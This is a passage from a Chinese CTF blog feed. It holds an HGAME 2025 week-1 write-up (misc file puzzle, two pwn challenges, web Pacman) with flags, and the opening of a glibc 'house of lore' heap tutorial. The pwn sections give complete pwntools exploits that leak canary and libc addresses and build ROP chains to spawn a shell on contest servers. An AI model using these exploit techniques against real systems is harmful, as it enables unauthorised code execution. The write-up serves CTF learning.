class="line"></span><br></pre></td></tr></table></figure><ul><li>然后使用<code>010editor</code>查看这个二进制文件，发现好像是<code>zip</code>的文件头</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102513784.png" alt="image-20250211102513784"></p><ul><li>所以把文件的后缀改为<code>zip</code>，就会发现压缩包中有flag，但是需要密码</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102606282.png" alt="image-20250211102606282"></p><ul><li>这时再翻到这个文件二进制形式的结尾，发现这边是个png头颠倒过来。</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102712572.png" alt="image-20250211102712572"></p><ul><li>所以就再将这个二进制位倒序输出到另一个文件中。这时就会出现一个<code>png</code>的图片</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102834269.png" alt="image-20250211102834269"></p><ul><li>再使用<code>010editor</code>打开该<code>png</code>文件，发现格式<code>png</code>的格式有点问题</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103056770.png" alt="image-20250211103056770"></p><ul><li>这时我们尝试修改图片的宽、高，原宽高为</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103159833.png" alt="image-20250211103159833"></p><ul><li>修改后的宽高为</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103221069.png" alt="image-20250211103221069"></p><ul><li>打开修改后的图片就会发现密码</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103239610.png" alt="image-20250211103239610"></p><ul><li>这时就能解密压缩包了，这样就可以得到<code>flag</code>文件了</li><li>flag：<code>hagme&#123;h4kyu4_w4nt_gir1f3nd_+q_931290928&#125;</code></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103319652.png" alt="image-20250211103319652"></p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="counting-petals"><a class="markdownIt-Anchor" href="#counting-petals"></a> counting petals</h2><ul><li>先来查看一下保护机制，发现保护全开</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103849211.png" alt="image-20250211103849211"></p><ul><li>反编译一下该程序，分析程序逻辑。<ul><li>先初始化一下输入、输出，然后再生成一个随机数。</li><li>接下来要求用户输入一个数，这个数<code>小于等于16</code></li><li>这个我们就可以对<code>v7</code>这个数组进行输入（注意这边可以对数组越界访问，可以覆盖其他地址的值）</li><li>然后对<code>v7[0]</code>这个地方进行修改</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211104018739.png" alt="image-20250211104018739"></p><ul><li>之后的程序执行流程如下：<ul><li>会逐个输出<code>v7</code>数组中的值（这里可能会因为数组的越界访问，会导致地址的泄露），并且将这些值加入到<code>v7[0]</code>中</li><li>还会将之前的一个随机数加到<code>v7[0]</code>上</li><li>检查<code>v7[0]</code>的最后1位是否为<code>0</code>，如果为<code>0</code>就会退出循环</li><li>还会检查<code>v4</code>是否大于0，如果<code>v4大于0</code>也会退出循环</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211104510357.png" alt="image-20250211104510357"></p><ul><li>接下来进行动态调试，现在发现在循环的时候我们写入栈中的数据范围如下，这时我们可以溢出图中箭头指向的位置。之后我们就可以通过之后的循环加法输出从而泄露栈</li><li>图中箭头指向的位置刚好是变量<code>v8</code>、变量<code>v5</code>所存储的位置，低地址为变量<code>v8</code>，高地址为变量<code>v9</code></li><li>这里还要注意一下，虽然是<code>scanf(&quot;%ld&quot;)</code>,但是可以读入8字节的整数，这时我们需要溢出修改<code>v9</code>、<code>v8</code>的值然后就可以进行泄露。</li><li>这里还要注意一点就是<code>v8</code>的值一定要小于<code>v9</code>这样才会跳出循环，所以我构造<code>85899345939</code>即（<code>0x1400000013</code>）</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211105451616.png" alt="image-20250211105451616"></p><ul><li>之后就可以泄露<code>canary</code>、<code>libc</code>的地址，之后会再一次循环，这次循环我们修改<code>v8</code>、<code>v9</code>的值为<code>-8589934569</code>即（<code>0xFFFFFFFE00000017</code>）这时我们就可以修改<code>v4</code>使其大于0，这样必然可以退出循环，不必考虑随机数的问题</li><li>之后我们修改<code>v8</code>、<code>v9</code>我们的循环此时还没退出，还要继续输入，这时我们再趁机修改<code>v8</code>、<code>v9</code>的值为<code>73014444057</code>（即<code>0x11 0000 0019</code>）</li><li>这样我们就可以构造<code>rop</code>链，从而getshell</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.hgame.vidar.club&#x27;</span>,<span class="number">30149</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;this time?\n&#x27;</span>,<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;85899345939&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">result = p.recvline()</span><br><span class="line">result = result.decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">canary = result[<span class="number">16</span>]</span><br><span class="line">libc_start = result[<span class="number">18</span>]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">canary = <span class="built_in">int</span>(canary,<span class="number">10</span>)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">libc_start = <span class="built_in">int</span>(libc_start,<span class="number">10</span>)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary---&gt;&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_start---&gt;&quot;</span>,<span class="built_in">hex</span>(libc_start))</span><br><span class="line">libc_addr = libc_start - <span class="number">0x29D90</span></span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x000000000002a3e5</span> <span class="comment">#: pop rdi ; ret</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x50D70</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x1D8678</span></span><br><span class="line">ret = libc_addr + <span class="number">0x0000000000029139</span><span class="comment"># : ret</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;this time?\n&#x27;</span>,<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;-8589934569&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;73014444057&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="built_in">str</span>(ret&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="built_in">str</span>(pop_rdi&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="built_in">str</span>(sh_addr&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="built_in">str</span>(sys_addr&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211122353599.png" alt="image-20250211122353599"></p><h2 id="format"><a class="markdownIt-Anchor" href="#format"></a> format</h2><ul><li>这题的泄露地址和<code>XYCTF</code>中的一题比较像，先来查看一下保护机制，发现没有开<code>pie</code>和<code>canary</code></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211110918764.png" alt="image-20250211110918764"></p><ul><li>接下来反编译分析一下程序<ul><li>该程序会先让我们读入，我们格式化输入输出的此时，注意这边有字符串格式化漏洞（这边需要使用<code>%p</code>泄露栈地址），因为<code>scanf(&quot;%3s&quot;)</code>已经限制了输入只能3个字符（所以不能使用<code>%7$p</code>）</li><li>之后又存在一个栈溢出<code>v5</code>这边是<code>int</code>类型</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211112623739.png" alt="image-20250211112623739"></p><ul><li>但是<code>vuln</code>这边对于参数传递过去的<code>v5</code>就会变成<code>unsigned int</code>类型</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211115311207.png" alt="image-20250211115311207"></p><ul><li>这就会导致溢出，接下来我们进行动态调试，由动态调试可以得知，我们<code>read(0,buf,a1)</code>中<code>buf</code>的位置在栈上中上面一个红色框的范围中</li><li>我们注意到<code>printf(format)</code>中的<code>format</code>存储在箭头指向的地址，此时我们就可以先通过栈溢出，修改<code>format</code>的值为<code>%9$p</code>，从而泄露libc的地址，并且这时候在<code>format</code>之前会覆盖返回地址，这时我们覆盖返回地址为<code>0x4012CF</code>,这样我们就可以泄露libc地址，并且还可以重新再利用<code>read</code>进行一次栈溢出，从而构造<code>rop</code>链getshell</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211115533200.png" alt="image-20250211115533200"></p><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211115959467.png" alt="image-20250211115959467"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.227.88&#x27;</span>,<span class="number">31314</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;n =&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;type something:&#x27;</span>,<span class="string">b&#x27;%p\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;you type:&#x27;</span>)</span><br><span class="line">stack = p.recvline()[<span class="number">1</span>:<span class="number">15</span>]</span><br><span class="line">stack = <span class="built_in">int</span>(stack,<span class="number">16</span>) + <span class="number">8496</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack---&gt;&#x27;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;n =&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaaa&#x27;</span>+p64(stack)+p64(<span class="number">0x4012CF</span>)+<span class="string">b&#x27;%9$p&#x27;</span>+p32(<span class="number">0xffffffff</span>)+p64(<span class="number">0x100000001</span>)</span><br><span class="line"><span class="comment">#payload+=b&#x27;aaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaa&#x27;</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;type something:&#x27;</span>)</span><br><span class="line">libc_start = p.recvline()[:<span class="number">14</span>]</span><br><span class="line">libc_start = <span class="built_in">int</span>(libc_start,<span class="number">16</span>)</span><br><span class="line">libc_addr = libc_start - <span class="number">0x29D90</span></span><br><span class="line">ogg = libc_addr + <span class="number">0xebd43</span></span><br><span class="line">ret = libc_addr + <span class="number">0x29139</span></span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x2a3e5</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x50D70</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x1D8678</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;start-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_start))</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#p.sendlineafter(b&#x27;n =&#x27;,b&#x27;-1&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>+p64(stack)+p64(ret)+p64(pop_rdi)+p64(sh_addr) +p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211122315674.png" alt="image-20250211122315674"></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> WEB</h1><h2 id="level-24-pacman"><a class="markdownIt-Anchor" href="#level-24-pacman"></a> Level 24 Pacman</h2><ul><li>打开靶机，发现游戏题，直接去看<code>js</code>。一开始是在<code>inpage.js</code>这边看<code>js</code>，发现并没有什么与flag相关的东西。</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132119348.png" alt="image-20250206132119348"></p><ul><li>这时候去看<code>html</code>文件，发现还引用了三个<code>js</code>文件，逐一排查文件</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132222228.png" alt="image-20250206132222228"></p><ul><li>最后发现<code>flag</code>藏在<code>index.js</code>文件中，搜索<code>flag</code>发现没结果，但是在这边看到了一个<code>gift</code></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132414923.png" alt="image-20250206132414923"></p><ul><li>这时在搜素<code>gift</code>发现还有二个</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132528103.png" alt="image-20250206132528103"></p><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132548797.png" alt="image-20250206132548797"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gift:aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=</span><br><span class="line">gift:aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==</span><br><span class="line">gift:aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==</span><br></pre></td></tr></table></figure><ul><li><code>base64</code>解码后得到：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">haeu4epca_4trgm&#123;_r_amnmse&#125;</span><br><span class="line">haepaiemkspretgm&#123;rtc_ae_efc&#125;</span><br><span class="line">haepaiemkspretgm&#123;rtc_ae_efc&#125;</span><br></pre></td></tr></table></figure><ul><li>栅栏密码解密后如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;u_4re_pacman_m4ster&#125;</span><br><span class="line">hgame&#123;pratice_makes_perfect&#125;</span><br><span class="line">hgame&#123;pratice_makes_perfect&#125;</span><br></pre></td></tr></table></figure><ul><li>提交后发现正确的flag为这个：</li></ul><p>flag：<code>hgame&#123;u_4re_pacman_m4ster&#125;</code></p>]]></content>
    
    
    <summary type="html">打了打hg的week1,PWn有一题牢不出来QAQ,ROP链不知道怎么构造</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-lore</title>
    <link href="http://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/"/>
    <id>http://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/</id>
    <published>2025-02-11T16:53:32.000Z</published>
    <updated>2025-02-22T13:27:17.769Z</updated>
    
    <content type="html"><![CDATA[<ul><li>这个堆利用就需要伪造堆块了，<code>house of lore</code>这个利用方式只对<code>glibc2.23-glibc2.31</code> 之间的这个版本</li><li><code>glibc2.31</code>以上的版本<code>house of lore</code>的利用方式基本失效。</li></ul><h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><ul><li><p>这里也统一认知，之前介绍了在堆块的物理地址中<code>高地址</code>为前，<code>低地址</code>为后，接下来对堆块的逻辑地址的前后进行一个认知的统一。</p></li><li><p>通常在释放的堆块如果被<code>bins</code>管理，他们都会将<code>fd</code>指针和<code>bk</code>指针给利用起来，之前一直没搞明白<code>fd</code>指针指向前面还是后面，<code>bk</code>指针指向前面还是后面。</p></li><li><p><code>fd</code>指针的全称为<code>forward pointer</code>，<code>bk</code>指针的全称为<code>backward pointer</code>。在<code>fastbin</code>和<code>tcachebin</code>中我们使用了<code>fd</code>指针，并且这个时候<code>fd</code>指针都指向的是远离<code>bins</code>堆块的方向。这边就以<code>tcache_bins</code>的图片为例子。</p></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250219120847941.png" alt="image-20250219120847941"></p><ul><li>所以这次我们对逻辑地址做一个认知统一。<ul><li>远离<code>bins</code>的堆块是更前面的堆块，所以<code>fd</code>指针指向的是远离<code>bins</code>的堆块</li><li>靠近<code>bins</code>的堆块是更后面的堆块，所以<code>bk</code>指针指向的是靠近<code>bins</code>的堆块</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250219121132346.png" alt="image-20250219121132346"></p><h2 id="smallbin机制"><a class="markdownIt-Anchor" href="#smallbin机制"></a> smallbin机制</h2><ul><li><p>这里为了能更好的理解<code>house of lore</code>接下来就要了解一下<code>smallbin</code>这个<code>bins</code>的运行机制，这样更有利于我们学习<code>house of lore</code></p></li><li><p>之前我们释放的堆块基本上都是被放入<code>fastbin</code>、<code>tachacbin</code>、<code>unsortedbin</code>，这三个bins中，很少有见到释放的堆块被放入<code>smallbin</code>中。所以我们先研究一下怎样才能使得被释放的堆块放入<code>smallbin</code>中。</p></li><li><p><code>smallbin</code>是一个双向循环链表的结构，并且<code>smallbin</code>是一个长为<code>64</code>的一个数组。在相关宏定义中这个<code>#define NSMALLBINS 64</code>可以知道是<code>64</code>个堆块的数组。</p></li><li><p>从<code>malloc.c</code>中的这个结构体定义中<code>struct malloc_state</code>还可以得知<code>  mchunkptr bins[NBINS * 2 - 2];</code>，这个堆块长度为<code>254</code>长度，其中包含了<code>smallbin</code>和<code>largebin</code>。</p><ul><li>注意：<strong>这里会存在一个误区，这边的bins既然是254个元素是否与之前unlink 图片所说的largebins和smallbins的个数不一样</strong></li><li>注意：<strong>由于smallbins和largebins是一个双向链表结构，而bins数组中的每一个元素相当与一个指针，为了使得bins能够有两个指针，所以对应smallbins[0]它会将bins[0]作为fd指针,bins[1]作为bk指针，利用这种方式构造一个双向头结点</strong></li></ul></li><li><p>从<code>62-63</code>行代码的宏定义<code>in_smallbin_range</code>可以得知，<code>chunk_size＜MIN_LARGE_SIZE</code>即在<code>64</code>位系统中小于<code>0x400</code>大小的chunk都会被放入<code>smallbin</code>的堆块里面，在<code>32</code>位系统中小于<code>0x200</code>大小的chunk都会被放入<code>smallbin</code>的堆块里面（在相关代码中的宏定义有做具体介绍）</p></li><li><p>从<code>66-68</code>行代码的宏定义<code>smallbin_index</code>可以得知，每个相邻<code>smallbin</code>存储的空闲堆块size位在<code>64</code>位中相差<code>0x10</code>字节，在<code>32</code>位中相差<code>0x8</code>字节</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 堆块结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 堆块结构和堆块指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="comment">// 两个数组宏定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里面有定义着smallbin和largebin的数组</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span 